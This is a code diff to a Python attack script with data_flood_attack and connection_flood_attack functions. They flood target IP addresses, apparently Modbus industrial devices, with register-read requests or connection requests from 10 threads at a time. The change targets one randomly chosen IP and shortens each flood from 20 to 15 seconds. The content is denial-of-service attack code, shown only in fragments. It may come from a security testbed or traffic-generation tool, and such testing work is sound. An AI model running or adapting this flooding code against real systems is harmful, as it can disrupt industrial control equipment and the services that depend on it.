@@ -403,16 +403,16 @@ def data_flood_attack(ip_addresses):
             elif func_code == 4:
                 client.read_input_registers(address=address, count=num_values)
 
-    for ip in ip_addresses:
-        print(f"Flooding {ip} with random packets from 10 threads for 20 seconds")
+    ip = random.choice(ip_addresses)
+    print(f"Flooding {ip} with random packets from 10 threads for 15 seconds")
 
-        stop_looping = Event()
-        for _ in range(10):
-            th_flooder = Thread(target=_flood, args=(ip, stop_looping))
-            th_flooder.start()
+    stop_looping = Event()
+    for _ in range(10):
+        th_flooder = Thread(target=_flood, args=(ip, stop_looping))
+        th_flooder.start()
 
-        time.sleep(20)
-        stop_looping.set()
+    time.sleep(15)
+    stop_looping.set()
 
     print("### DATA FLOOD ATTACK FINISH ###")
 
@@ -431,16 +431,16 @@ def connection_flood_attack(ip_addresses):
             time.sleep(0.01)
             client.close()
 
-    for ip in ip_addresses:
-        print(f"Flooding {ip} with connection requests from 10 threads for 20 seconds")
+    ip = random.choice(ip_addresses)
+    print(f"Flooding {ip} with connection requests from 10 threads for 15 seconds")
 
-        stop_looping = Event()
-        for _ in range(10):
-            th_flooder = Thread(target=_flood_connection, args=(ip, stop_looping))
-            th_flooder.start()
+    stop_looping = Event()
+    for _ in range(10):
+        th_flooder = Thread(target=_flood_connection, args=(ip, stop_looping))
+        th_flooder.start()
 
-        time.sleep(20)
-        stop_looping.set()
+    time.sleep(15)
+    stop_looping.set()
 
     print("### CONNECTION FLOOD ATTACK FINISH ###")
 
